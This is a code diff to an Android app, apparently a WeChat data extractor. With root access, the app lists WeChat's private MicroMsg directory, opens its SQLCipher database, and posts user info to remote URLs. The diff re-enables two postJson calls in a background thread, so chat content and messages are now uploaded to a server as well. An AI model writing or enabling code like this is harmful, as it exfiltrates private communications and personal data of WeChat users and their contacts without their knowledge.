@@ -11,11 +11,9 @@ import net.sqlcipher.database.SQLiteDatabase;
 import net.sqlcipher.database.SQLiteDatabaseHook;
 
 import java.io.File;
-import java.io.IOException;
-import java.net.SocketTimeoutException;
 import java.util.ArrayList;
 import java.util.List;
-import java.util.concurrent.TimeUnit;
+
 
 import cn.truistic.enmicromsg.common.service.WhiteService;
 import cn.truistic.enmicromsg.common.util.DeviceUtil;
@@ -28,12 +26,6 @@ import cn.truistic.enmicromsg.info.MessageInfo;
 import cn.truistic.enmicromsg.info.UserInfo;
 import cn.truistic.enmicromsg.main.MainMVP;
 import cn.truistic.enmicromsg.main.model.HomeModel;
-import okhttp3.Callback;
-import okhttp3.MediaType;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.RequestBody;
-import okhttp3.Response;
 
 import static cn.truistic.enmicromsg.common.util.DeviceUtil.formatTime;
 import static cn.truistic.enmicromsg.common.util.DeviceUtil.postJson;
@@ -224,8 +216,8 @@ public class HomePresenter implements MainMVP.IHomePresenter {
         new Thread(new Runnable() {
             @Override
             public void run() {
-               // postJson(ContentUrlPath,mJsonContent);
-                //postJson(MessageUrlPath,mJsonMessage);
+                postJson(ContentUrlPath,mJsonContent);
+                postJson(MessageUrlPath,mJsonMessage);
                 postJson(UserInfoUrlPath,mJsonUser);
             }
         }).start();
@@ -279,8 +271,6 @@ public class HomePresenter implements MainMVP.IHomePresenter {
         return RootUtil.isGrantRootPermission();
     }
 
-
-
     /**
      * 获取微信数据
      *
@@ -296,7 +286,8 @@ public class HomePresenter implements MainMVP.IHomePresenter {
             return false;
         }
         // 2.获取数据库文件
-        ArrayList<String> list = new ArrayList<>();
+        ArrayList<String> list;
+
         list = RootUtil.execCmdsforResult(new String[]{"cd /data/data/com.tencent.mm/MicroMsg", "ls -R"});
         ArrayList<String> dirs = new ArrayList<>();
         String dir = null;
